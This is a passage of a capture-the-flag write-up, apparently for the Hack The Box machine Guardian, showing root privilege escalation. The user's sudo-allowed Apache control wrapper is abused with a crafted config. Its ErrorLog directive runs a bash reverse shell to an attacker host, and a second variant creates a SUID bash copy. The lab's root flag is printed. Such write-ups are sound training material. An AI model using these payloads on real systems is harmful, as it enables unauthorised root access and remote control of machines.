[+] Logging to /home/kali/.penelope/guardian~10.129.101.248-Linux-x86_64/2025_09_01-09_53_36-840.log 📜
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
mark@guardian:/opt/scripts/utilities/utils$
```

BOOM! We got our reverse shell as `mark`.

```bash
mark@guardian:/opt/scripts/utilities/utils$ id
uid=1001(mark) gid=1001(mark) groups=1001(mark),1002(admins)
```

### Discovery (mark)
```bash
mark@guardian:/opt/scripts/utilities/utils$ sudo -l
Matching Defaults entries for mark on guardian:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User mark may run the following commands on guardian:
    (ALL) NOPASSWD: /usr/local/bin/safeapache2ctl
```

So `mark` can run Apache control script with `root` privileges. <br>
&rarr; Let's run to see what options we need to escalated to `root`.

### safeapache2ctl
```bash
mark@guardian:/usr/local/bin$ /usr/local/bin/safeapache2ctl
Usage: /usr/local/bin/safeapache2ctl -f /home/mark/confs/file.conf
```

This script require config file from `/home/mark/confs/file.conf` but the `/confs` seems to be empty.

```bash
mark@guardian:~$ ls -la
total 28
drwxr-x--- 4 mark mark 4096 Jul 14 16:57 .
drwxr-xr-x 6 root root 4096 Jul 30 14:59 ..
lrwxrwxrwx 1 root root    9 Jul 14 16:57 .bash_history -> /dev/null
-rw-r--r-- 1 mark mark  220 Apr 18 10:11 .bash_logout
-rw-r--r-- 1 mark mark 3805 Apr 19 07:52 .bashrc
drwx------ 2 mark mark 4096 Apr 26 09:42 .cache
drwxrwxr-x 2 mark mark 4096 Jul 13 09:24 confs
lrwxrwxrwx 1 root root    9 Apr 19 07:35 .mysql_history -> /dev/null
-rw-r--r-- 1 mark mark  807 Apr 18 10:11 .profile
mark@guardian:~$ cd confs/
mark@guardian:~/confs$ ls -la
total 8
drwxrwxr-x 2 mark mark 4096 Jul 13 09:24 .
drwxr-x--- 4 mark mark 4096 Jul 14 16:57 ..
```

Take some internet for `safeapache2ctl` seems not working as this one is not common, the common one is `apache2ctl` where we can check out this [apache2ctl](https://manpages.ubuntu.com/manpages/questing/en/man8/apache2ctl.8.html) for more.
&rarr; Now we gonna create a mailicious config file and exploit to escalated to `root` via Apache [ErrorLog](https://httpd.apache.org/docs/2.4/mod/core.html#errorlog) directive with `|` to executed the commands.

## Privilege Escalation
Now let's create mailicous config and place in `/home/mark/confs`.

### Apache config
```bash
# shell.conf
LoadModule mpm_prefork_module /usr/lib/apache2/modules/mod_mpm_prefork.so
ServerRoot "/etc/apache2"
ServerName localhost
PidFile /tmp/apache-rs.pid
Listen 127.0.0.1:8080
ErrorLog "|/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.16.36/6666 0>&1'"
```

Setup our listener.

```bash
└─$ penelope -p 6666                                               
[+] Listening for reverse shells on 0.0.0.0:6666 →  127.0.0.1 • 172.16.147.139 • 172.17.0.1 • 10.10.16.36
- 🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
```

Now let's run the commands via `mark` sudo privileges.

```bash
mark@guardian:~/confs$ sudo /usr/local/bin/safeapache2ctl -f /home/mark/confs/shell.conf
```

Hold on.

```bash
└─$ penelope -p 6666                                               
[+] Listening for reverse shells on 0.0.0.0:6666 →  127.0.0.1 • 172.16.147.139 • 172.17.0.1 • 10.10.16.36
- 🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from guardian~10.129.101.248-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Got reverse shell from guardian~10.129.101.248-Linux-x86_64 😍 Assigned SessionID <2>
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/kali/.penelope/guardian~10.129.101.248-Linux-x86_64/2025_09_01-10_39_29-254.log 📜
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
root@guardian:/etc/apache2#
```

There we go, got our reverse shell as `root`.

```bash
root@guardian:/root# ls -la
total 60
drwx------  8 root root 4096 Sep  1 09:58 .
drwxr-xr-x 20 root root 4096 Jul 14 16:57 ..
lrwxrwxrwx  1 root root    9 Jul 14 16:57 .bash_history -> /dev/null
-rw-r--r--  1 root root 3226 Apr 19 07:51 .bashrc
drwx------  2 root root 4096 Aug 21 19:07 .cache
drwx------  3 root root 4096 Jul 22 21:55 .config
-rw-r--r--  1 root root  119 Apr 21 17:03 .gitconfig
-rw-------  1 root root   20 Aug 13 09:46 .lesshst
drwxr-xr-x  3 root root 4096 Apr 12 08:38 .local
lrwxrwxrwx  1 root root    9 Apr 12 10:17 .mysql_history -> /dev/null
drwx------  3 root root 4096 Jul 10 18:19 .pki
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
-rw-r--r--  1 root root   66 Apr 21 16:49 .selected_editor
drwx------  2 root root 4096 Apr 11 20:24 .ssh
-rw-r--r--  1 root root  205 Jul 14 16:56 .wget-hsts
-rw-r-----  1 root root   33 Sep  1 09:58 root.txt
drwxr-xr-x  2 root root 4096 Aug 13 11:57 scripts
root@guardian:/root# cat root.txt
3716405fe817ce458866ff864be5b724
```

Grab our `root.txt` flag.

Also we can use the `ErrorLog` to exploit the SUID way.

```bash
ErrorLog "|/bin/sh -c 'cp /bin/bash /tmp/bash && chmod +s /tmp/bash'"
```

When we run again.

```bash
mark@guardian:~/confs$ sudo /usr/local/bin/safeapache2ctl -f /home/mark/confs/suid.conf
```

```bash
mark@guardian:/tmp$ ls -la
total 1456
drwxrwxrwt 21 root  root     4096 Sep  1 14:42 .
drwxr-xr-x 20 root  root     4096 Jul 14 16:57 ..
-rwsr-sr-x  1 root  root  1396520 Sep  1 14:42 bash
drwx------  2 sammy sammy    4096 Sep  1 10:08 .com.google.Chrome.EBfhkm
drwx------  2 sammy sammy    4096 Sep  1 13:11 .com.google.Chrome.eNA1yx
drwx------  2 sammy sammy    4096 Sep  1 10:07 .com.google.Chrome.jLXljX
drwx------  2 sammy sammy    4096 Sep  1 13:12 .com.google.Chrome.PR2ygr
drwx------  2 sammy sammy    4096 Sep  1 10:06 .com.google.Chrome.sG8Lf7
drwx------  2 sammy sammy    4096 Sep  1 13:12 .com.google.Chrome.z37ZHu
drwxrwxrwt  2 root  root     4096 Sep  1 09:58 .font-unix
drwxrwxrwt  2 root  root     4096 Sep  1 09:58 .ICE-unix
-rw-rw-r--  1 mark  mark      167 Sep  1 14:17 shell.c
drwx------  2 root  root     4096 Sep  1 09:58 snap-private-tmp
-rwxrwx---  1 jamil jamil     253 Sep  1 13:51 status.py.bak
drwx------  3 root  root     4096 Sep  1 09:58 systemd-private-afb7d4c75902458490aef73c1e073f53-apache2.service-19SZHC
drwx------  3 root  root     4096 Sep  1 09:58 systemd-private-afb7d4c75902458490aef73c1e073f53-ModemManager.service-Tx9LrD
drwx------  3 root  root     4096 Sep  1 09:58 systemd-private-afb7d4c75902458490aef73c1e073f53-systemd-logind.service-Wgt8zs
drwx------  3 root  root     4096 Sep  1 09:58 systemd-private-afb7d4c75902458490aef73c1e073f53-systemd-resolved.service-RGxk6n
drwx------  3 root  root     4096 Sep  1 09:58 systemd-private-afb7d4c75902458490aef73c1e073f53-systemd-timesyncd.service-rQUeyo
drwx------  3 root  root     4096 Sep  1 10:06 systemd-private-afb7d4c75902458490aef73c1e073f53-upower.service-O6Fvmx
drwxrwxrwt  2 root  root     4096 Sep  1 09:58 .Test-unix
drwx------  2 root  root     4096 Sep  1 09:58 vmware-root_639-3988031840
drwxrwxrwt  2 root  root     4096 Sep  1 09:58 .X11-unix
drwxrwxrwt  2 root  root     4096 Sep  1 09:58 .XIM-unix
```

There will be file `bash` with suid where we can execute to escalated to `root`.

```bash
mark@guardian:/tmp$ /tmp/bash -p
bash-5.1# id
uid=1001(mark) gid=1001(mark) euid=0(root) egid=0(root) groups=0(root),1001(mark),1002(admins)
bash-5.1# cd /root
bash-5.1# ls -la
total 60
drwx------  8 root root 4096 Sep  1 09:58 .
drwxr-xr-x 20 root root 4096 Jul 14 16:57 ..
lrwxrwxrwx  1 root root    9 Jul 14 16:57 .bash_history -> /dev/null
-rw-r--r--  1 root root 3226 Apr 19 07:51 .bashrc
drwx------  2 root root 4096 Aug 21 19:07 .cache
drwx------  3 root root 4096 Jul 22 21:55 .config
-rw-r--r--  1 root root  119 Apr 21 17:03 .gitconfig
-rw-------  1 root root   20 Aug 13 09:46 .lesshst
drwxr-xr-x  3 root root 4096 Apr 12 08:38 .local
lrwxrwxrwx  1 root root    9 Apr 12 10:17 .mysql_history -> /dev/null
drwx------  3 root root 4096 Jul 10 18:19 .pki
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
-rw-r-----  1 root root   33 Sep  1 09:58 root.txt
drwxr-xr-x  2 root root 4096 Aug 13 11:57 scripts
-rw-r--r--  1 root root   66 Apr 21 16:49 .selected_editor
drwx------  2 root root 4096 Apr 11 20:24 .ssh
-rw-r--r--  1 root root  205 Jul 14 16:56 .wget-hsts
bash-5.1# cat root.txt
3716405fe817ce458866ff864be5b724
```

> *Also there are other way to leverage to `root`, if you guys found other way, hit me out! :>, tks.*

![result](/assets/img/guardian-htb-release-area-machine/result.png)